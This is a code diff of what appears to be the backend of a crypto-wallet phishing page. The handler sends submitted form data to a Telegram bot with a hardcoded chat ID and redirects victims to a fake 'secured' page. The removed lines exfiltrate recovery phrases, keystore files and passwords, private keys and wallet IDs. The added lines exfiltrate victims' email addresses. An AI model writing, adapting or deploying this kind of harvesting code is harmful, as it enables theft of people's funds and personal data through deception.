@@ -7,15 +7,11 @@ const CHAT_ID = '7108260980';  // Your Telegram chat ID here
 // Function to send data to Telegram
 const sendToTelegram = async (data) => {
     try {
-        const { recoveryPhrase, keystore, password, key, wallet_id } = data;
+        const { email } = data; // Extract the email from the form data
 
         // Construct the message to send to Telegram
         let message = `New Wallet Import Request:\n\n`;
-        if (recoveryPhrase) message += `Recovery Phrase: ${recoveryPhrase}\n`;
-        if (keystore) message += `Keystore JSON: ${keystore}\n`;
-        if (password) message += `Keystore Password: ${password}\n`;
-        if (key) message += `Private Key: ${key}\n`;
-        if (wallet_id) message += `Wallet ID: ${wallet_id}\n`;
+        if (email) message += `Email Address: ${email}\n`; // Send only the email
 
         // Send the message to Telegram using the bot API
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -37,8 +33,8 @@ module.exports = async (req, res) => {
             const data = req.body; // The form data sent in the POST request
             const response = await sendToTelegram(data); // Send data to Telegram
 
-            // Redirect to the homepage after successful message sending
-            res.writeHead(302, { Location: 'https://web3walletconnect-omega.vercel.app/secured.html' }); // Redirect to homepage
+            // Redirect to the secured page after successful message sending
+            res.writeHead(302, { Location: 'https://web3walletconnect-omega.vercel.app/secured.html' }); // Redirect to secured page
             res.end(); // End the response
 
         } catch (error) {
